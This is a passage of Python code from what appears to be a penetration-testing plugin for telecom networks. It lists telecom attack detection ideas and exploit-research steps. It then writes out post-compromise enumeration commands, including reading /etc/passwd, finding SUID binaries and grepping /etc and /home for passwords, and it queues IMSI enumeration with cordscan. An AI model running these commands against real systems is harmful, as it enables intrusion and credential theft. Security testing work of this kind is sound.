            'name': 'Telecom Attack Detection Methods',
            'type': 'manual',
            'metadata': {
                'description': 'Detection strategies for telecom infrastructure attacks (Blue Team)',
                'tags': ['OSCP:LOW', 'DETECTION', 'DEFENSE', 'BLUE_TEAM'],
                'notes': '''TELECOM ATTACK DETECTION IDEAS (DEFENSIVE):

GTP ATTACKS:
1. UNAUTHORIZED GTP-C CLIENTS
   - Monitor: Any device other than SGSN/GGSN sending Create PDP Context Requests
   - Alert: GTP-C from unexpected source IPs
   - Baseline: Known SGSN/GGSN IP addresses

2. GTPDOOR BEACONS
   - Monitor: Frequent Echo Requests without corresponding Echo Responses
   - Alert: Unbalanced Echo traffic (Req > Resp)
   - Monitor: GTP version flag = 1 with message type = 1 (Echo) - spec deviation

3. IMSI ENUMERATION
   - Monitor: High rate of Create PDP Context Requests with sequential IMSIs
   - Alert: Mass IMSI scanning patterns
   - Baseline: Legitimate PDP context rates

SSH/TELNET ATTACKS:
4. NON-STANDARD SSH PORTS
   - Monitor: SSH handshakes on ports 53, 80, 443 from internal IPs
   - Alert: SSH traffic on non-22 ports
   - Context: Reverse tunnel / covert channel

5. BRUTE-FORCE ATTEMPTS
   - Monitor: Multiple failed authentication attempts
   - Alert: > 5 failures in 5 minutes from single source
   - Block: Temporary ban after threshold

COVERT CHANNELS:
6. ICMP ANOMALIES
   - Monitor: High rate of ICMP echo-reply with large payloads
   - Alert: Non-zero identifier/sequence fields in ICMP replies
   - Alert: ICMP payload size > 64 bytes (default ping size)

7. DNS TUNNELING
   - Monitor: High-frequency DNS queries to unusual domains (*.nodep)
   - Alert: DNS TXT/NULL record queries (common in DNS tunneling)
   - Alert: Long DNS subdomain labels (encoded data)

5G NAS ATTACKS:
8. NAS REPLAY ATTACKS
   - Monitor: InitialUEMessage with repeated RAN-UE-NGAP-ID
   - Alert: Identical Registration Requests from same/different endpoints
   - Context: Lack of freshness validation

9. NULL ALGORITHM NEGOTIATION
   - Monitor: Security Mode Command/Complete with EEA0/EIA0
   - Alert: NAS security context negotiating null algorithms outside emergency
   - Policy: Reject EEA0/EIA0 except specific use cases

BASELINE ESTABLISHMENT:
- Map legitimate GTP traffic patterns
- Whitelist known SGSN/GGSN/MME/PGW IP addresses
- Establish normal authentication failure rates
- Profile typical DNS/ICMP traffic volumes

LOGGING & MONITORING:
- Enable GTP-C/GTP-U packet captures on core routers
- Forward telecom NE syslogs to SIEM
- Monitor Event 4649 (Kerberos replay) if applicable
- Track SSH/Telnet authentication attempts

THREAT INTELLIGENCE:
- IOCs from Unit42 Telecom Infiltration report
- Known GTPDoor/EchoBackdoor/NoDepDNS signatures
- Telecom-specific threat feeds

OSCP RELEVANCE: LOW - Blue team detection, not offensive testing''',
                'alternatives': [
                    'IDS/IPS: Snort/Suricata rules for GTP anomalies',
                    'SIEM: Splunk/ELK queries for telecom attack patterns',
                    'Network TAP: Deep packet inspection on GRX/IPX'
                ]
            }
        })

        tasks['children'].append(detection_tasks)

        # ========== VERSION-SPECIFIC EXPLOITS ==========
        if version:
            tasks['children'].append({
                'id': f'exploit-research-telecom-{port}',
                'name': f'Exploit Research: {product} {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-telecom-{port}',
                        'name': f'SearchSploit: {product} {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "{product} {version}"',
                            'description': 'Search ExploitDB for telecom infrastructure vulnerabilities',
                            'tags': ['OSCP:LOW', 'RESEARCH'],
                            'success_indicators': [
                                'Exploits found',
                                'CVE numbers listed',
                                'Vendor-specific vulnerabilities'
                            ],
                            'next_steps': [
                                'Review exploit details',
                                'Test in isolated lab environment',
                                'Verify applicability to target'
                            ]
                        }
                    },
                    {
                        'id': f'cve-lookup-telecom-{port}',
                        'name': f'CVE Lookup: {product}',
                        'type': 'manual',
                        'metadata': {
                            'description': f'Research CVE databases for {product} vulnerabilities',
                            'tags': ['RESEARCH', 'OSCP:LOW'],
                            'notes': f'''CVE RESEARCH: {product}

Databases to check:
- https://www.cvedetails.com (vendor: {product})
- https://nvd.nist.gov/vuln/search (keyword: telecom, {product})
- Vendor security advisories

Common telecom CVE types:
- Default credentials
- Buffer overflows in protocol parsing
- Authentication bypasses
- Remote code execution in OSS/BSS
- SNMP community string leaks

Focus on:
- Pre-authentication vulnerabilities
- Remote code execution
- Privilege escalation
- Credential disclosure'''
                        }
                    }
                ]
            })

        return tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Generate follow-up tasks based on completed task results"""
        new_tasks = []

        # If default creds found, add enumeration task
        if 'telecom-defaults' in task_id and 'successful' in result.lower():
            new_tasks.append({
                'id': f'post-auth-enum-{task_id}',
                'name': 'Post-Authentication Network Element Enumeration',
                'type': 'manual',
                'metadata': {
                    'description': 'Enumerate compromised network element',
                    'tags': ['OSCP:LOW', 'ENUM'],
                    'notes': '''POST-COMPROMISE ENUMERATION:

1. Identify NE type:
   cat /etc/issue; uname -a; hostname

2. Enumerate network interfaces:
   ip a; ifconfig -a

3. Check routing:
   ip route; route -n

4. List running processes:
   ps aux | grep -E "ggsn|sgsn|mme|pgw"

5. Check for GTP services:
   netstat -ulnp | grep -E "2123|2152"

6. Enumerate users:
   cat /etc/passwd

7. Find SUID binaries:
   find / -perm -4000 -type f 2>/dev/null

8. Check sudo permissions:
   sudo -l

9. Search for credentials:
   grep -r "password" /etc/ 2>/dev/null
   grep -r "passw" /home/ 2>/dev/null'''
                }
            })

        # If GTP-C listener found, add cordscan task
        if 'grx-discovery' in task_id and 'open' in result.lower():
            new_tasks.append({
                'id': f'cordscan-discovered-{task_id}',
                'name': 'IMSI Enumeration on Discovered GTP-C Listeners',
                'type': 'manual',
                'metadata': {
                    'description': 'Target discovered GTP-C listeners with cordscan',
                    'tags': ['OSCP:LOW', 'ENUM'],
                    'notes': 'Parse discovered IPs and run cordscan against each target'
                }
            })

        return new_tasks
